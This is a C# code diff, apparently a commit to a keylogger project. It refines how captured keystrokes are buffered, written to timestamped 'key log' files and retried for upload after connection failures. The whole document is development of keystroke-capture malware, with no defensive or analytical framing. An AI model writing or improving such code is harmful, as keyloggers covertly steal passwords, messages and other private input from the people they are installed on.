@@ -2,6 +2,7 @@
 using System.Text;
 using System.IO;
 using System.Windows.Forms;
+using System.Threading;
 
 namespace IDK {
 
@@ -54,6 +55,10 @@ namespace IDK {
                     Buffer.Append(character);
                 }
             } catch {
+                if (Buffer == null) {
+                    Buffer = new StringBuilder();
+                }
+
                 // if an exception occurs it means it's not a single character
                 switch (keyString.ToUpper()) {
                     case "SPACE":
@@ -64,13 +69,8 @@ namespace IDK {
                         Buffer.AppendLine();
                         BufferLength++;
                         break;
-                    case "BACK":
-                        Buffer.Remove(Buffer.Length - 1, 1);
-                        break;
                     default:
-                        Buffer.AppendLine();
-                        Buffer.Append(keyString);
-                        Buffer.AppendLine();
+                        Buffer.Append(" {" + keyString + "} ");
                         break;
                 }
 
@@ -89,6 +89,10 @@ namespace IDK {
         /// Appends the content of the string buffer to the current log file
         /// </summary>
         private void WriteBufferToFile() {
+            if (CurrentLogFile == null) {
+                return;
+            }
+
             using (StreamWriter writer = File.AppendText(CurrentLogFile)) {
                 writer.WriteLine(Buffer.ToString());
                 Buffer.Clear();
@@ -128,7 +132,7 @@ namespace IDK {
             } else if (files.Length == 1) {
                 // there is only one file, if it is a log file, assign it to the current log file
                 if (files[0].Name.EndsWith(".txt") && files[0].Name.Contains(BASE_FILE_NAME)) {
-                     CurrentLogFile = LOG_DIRECTORY + files[0].Name;
+                    CurrentLogFile = LOG_DIRECTORY + files[0].Name;
                 }
             } else {
                 // create a new key log file
@@ -143,7 +147,7 @@ namespace IDK {
             DateTime now = DateTime.Now;
             CurrentLogFile = LOG_DIRECTORY + BASE_FILE_NAME + now.Year + "_" + now.Month + "_" + now.Day + "_" +
                 now.Hour + "_" + now.Minute + "_" + now.Second + "_" + now.Millisecond + ".txt";
-            File.CreateText(CurrentLogFile).Close();
+            File.CreateText(CurrentLogFile).Dispose();
         }
 
         /// <summary>
@@ -157,6 +161,7 @@ namespace IDK {
                     CurrentLogFile = null;
                     CanUpload = false;
                 } catch {
+                    Thread.Sleep(Config.CONNECTION_DELAY);
                     Update();
                 }
             }
